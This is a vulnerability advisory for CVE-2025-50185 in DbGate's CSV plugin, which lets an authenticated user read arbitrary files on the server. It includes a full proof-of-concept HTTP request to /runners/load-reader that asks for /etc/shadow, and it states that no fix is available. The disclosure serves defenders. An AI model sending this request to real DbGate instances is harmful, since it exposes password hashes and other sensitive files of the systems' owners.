# [M] DbGate allows Unauthorized File Access via CSV Plugin

## Summary
Severity: Medium
Advisory: CVE-2025-50185
Aliases: GHSA-7x75-fmx7-q6h9
CVSS: 6.0 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:P)
Published: 2025-07-26
Source: https://osv.dev/vulnerability/CVE-2025-50185
Type: osv

## Details
DbGate is cross-platform database manager. In versions 6.6.0 and below, DbGate allows unauthorized file access due to insufficient validation of file paths and types. A user with application-level access can retrieve data from arbitrary files on the system, regardless of their location or file type. The plugin fails to enforce proper checks on content type and file extension before reading a file. As a result, even sensitive files accessible only to the root user can be read through the application interface. There is currently no fix for this issue.






```
POST /runners/load-reader HTTP/1.1
Host: <REPLACE ME>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: <REPLACE ME>
Content-Type: application/json
Authorization: Bearer <REPLACE ME>
Content-Length: 127
Origin: http://192.168.124.119:3000
Connection: keep-alive
Cookie: <REPLACE ME>
Priority: u=0
Cache-Control: max-age=0

{"functionName":"reader@dbgate-plugin-csv","props":{"fileName":"/etc\/shadow","limitRows":100}}

```



The request payload:
![Screenshot From 2025-05-31 22-54-49](https://github.com/user-attachments/assets/28943ad7-14f8-432a-9836-cec5c3593c0a)


Lines of the file being returned:
![Screenshot From 2025-05-31 22-55-23](https://github.com/user-attachments/assets/4fae4652-097d-4d39-9f7a-6ce39346ed1d)

## References
- https://github.com/dbgate/dbgate/blob/v6.6.0/plugins/dbgate-plugin-csv/src/backend/reader.js#L71-L102
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2025/50xxx/CVE-2025-50185.json
- https://github.com/dbgate/dbgate/security/advisories/GHSA-7x75-fmx7-q6h9
- https://nvd.nist.gov/vuln/detail/CVE-2025-50185
